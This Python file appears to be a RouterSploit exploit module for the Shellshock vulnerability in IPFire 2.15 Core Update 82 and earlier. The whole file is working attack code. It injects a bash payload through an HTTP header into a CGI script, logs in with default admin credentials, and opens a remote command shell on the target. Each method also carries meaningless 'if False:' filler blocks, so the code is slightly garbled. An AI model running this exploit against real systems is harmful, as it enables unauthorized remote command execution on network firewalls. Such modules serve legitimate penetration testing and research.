from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):
    __info__ = {'name': 'IPFire Shellshock', 'description': 'Exploits shellshock vulnerability in IPFire <= 2.15 Core Update 82. If the target is vulnerable it is possible to execute commands on operating system level.', 'authors': ('Claudio Viviani', 'Marcin Bury <marcin@threat9.com>'), 'references': ('https://www.exploit-db.com/exploits/34839',), 'devices': ('IPFire <= 2.15 Core Update 82',)}
    target = OptIP('', 'Target IPv4 or IPv6 address')
    port = OptPort(444, 'Target HTTP port')
    ssl = OptBool(True, 'SSL enabled: true/false')
    username = OptString('admin', 'Username to log in with')
    password = OptString('admin', 'Password to log in with')

    def __init__(self):
        if False:
            for i in range(10):
                print('nop')
        self.payload = "() { :;}; /bin/bash -c '{{cmd}}'"

    def run(self):
        if False:
            i = 10
            return i + 15
        if self.check():
            print_success('Target is vulnerable')
            print_status('Invoking command loop...')
            shell(self)
        else:
            print_error('Target is not vulnerable')

    def execute(self, cmd):
        if False:
            for i in range(10):
                print('nop')
        marker = utils.random_text(32)
        cmd = 'echo {};{}'.format(marker, cmd)
        payload = self.payload.replace('{{cmd}}', cmd)
        headers = {'VULN': payload}
        response = self.http_request(method='GET', path='/cgi-bin/index.cgi', headers=headers, auth=(self.username, self.password))
        if response is None:
            return ''
        if response.status_code == 200:
            start = response.text.find(marker) + len(marker) + 1
            end = response.text.find('<!DOCTYPE html>', start)
            return response.text[start:end]
        return ''

    @mute
    def check(self):
        if False:
            print('Hello World!')
        marker = utils.random_text(32)
        cmd = 'echo {}'.format(marker)
        payload = self.payload.replace('{{cmd}}', cmd)
        headers = {'VULN': payload}
        response = self.http_request(method='GET', path='/cgi-bin/index.cgi', headers=headers, auth=(self.username, self.password))
        if response and marker in response.text:
            return True
        return False